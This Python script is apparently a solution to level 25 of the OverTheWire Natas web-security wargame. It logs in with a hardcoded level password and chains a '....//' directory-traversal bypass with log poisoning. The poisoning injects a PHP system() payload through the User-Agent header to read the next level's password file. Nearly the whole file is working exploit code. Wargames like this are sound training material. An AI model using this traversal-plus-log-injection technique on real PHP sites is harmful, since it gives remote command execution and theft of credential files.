import requests
import re


# Credentials for natas25
username = "natas25"
password = "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws"

# Target URL
url = "http://natas25.natas.labs.overthewire.org"

# Start a session to persist cookies and headers across requests
session = requests.Session()

# send POST request
response = session.post(
    url,
    auth=(username, password)
)

# extract cookie value from the page
cookievalue = session.cookies["PHPSESSID"]
# path to the system log file
log_path = f"?lang=....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_{cookievalue}.log"
# full url to the system log file
log_url = f"http://natas25.natas.labs.overthewire.org/{log_path}"
# PHP payload to inject into User-Agent
payload = "<?php System(\"echo natas26; cat /etc/natas_webpass/natas26; echo natas26;\"); ?>"
# Our malicious User-Agent
payload_header = {"User-Agent": payload}

# send GET request with our payloads
get_response = session.get(
    log_url,
    headers = payload_header,
    auth=(username, password)
)

# print the response
print(get_response.text)